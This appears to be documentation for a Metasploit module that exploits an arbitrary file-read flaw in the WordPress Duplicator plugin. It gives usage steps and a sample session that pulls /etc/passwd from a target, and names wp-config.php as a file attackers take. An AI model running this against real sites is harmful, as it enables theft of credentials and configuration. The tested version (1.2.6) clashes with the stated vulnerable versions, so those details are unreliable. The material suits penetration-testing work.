## Description
The issue is being actively exploited, and allows attackers to download arbitrary files, such as the wp-config.php file.
According to the vendor, the vulnerability was only in two versions v1.3.24 and v1.3.26, the vulnerability wasn't present in versions 1.3.22 and before.

## Verification Steps

Confirm that functionality works:
1. Start `msfconsole`
2. `use auxiliary/scanner/http/wp_duplicator_file_read`
3. Set the `RHOSTS`
4. Set the `RPORT`
5. Set the `DEPTH`
6. Set the `FILEPATH`
6. Run the exploit: `run`
 

## Scenarios

```
msf5 > use auxiliary/scanner/http/wp_duplicator_file_read
msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set rport 8080
rport => 8080
msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set FILEPATH /etc/passwd
FILEPATH => /etc/passwd
msf5 auxiliary(scanner/http/wp_duplicator_file_read) > set DEPTH 5
DEPTH => 5

msf5 auxiliary(scanner/http/wp_duplicator_file_read) > run

[*] Downloading file...

[....Content File....]

[+] File saved in: /root/.msf4/loot/20201211005722_default_13.250.118.98_duplicator.trave_383073.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Test environment

Ubuntu 20.04 running WordPress 5.6, Duplicator 1.2.6
